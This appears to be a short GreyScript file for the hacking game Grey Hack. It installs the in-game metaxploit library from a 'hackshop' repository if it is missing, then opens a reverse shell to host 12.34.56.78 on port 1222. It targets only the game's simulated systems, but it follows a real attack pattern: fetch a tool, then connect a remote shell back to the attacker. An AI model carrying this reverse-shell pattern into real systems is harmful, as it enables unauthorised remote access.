// Made by aldusbumdlebore
// 05 / 20 / 2024

mx = include_lib("/lib/metaxploit.so")
if not mx then    
    get_shell.launch("/bin/apt-get", "update")
    get_shell.launch("/bin/apt-get", "addrepo $HACKSHOP_IP")
    get_shell.launch("/bin/apt-get", "update")
    get_shell.launch("/bin/apt-get", "install metaxploit.so")
    mx = include_lib("/lib/metaxploit.so")
end if
mx.rshell_client("12.34.56.78", 1222, "bumdlebore")
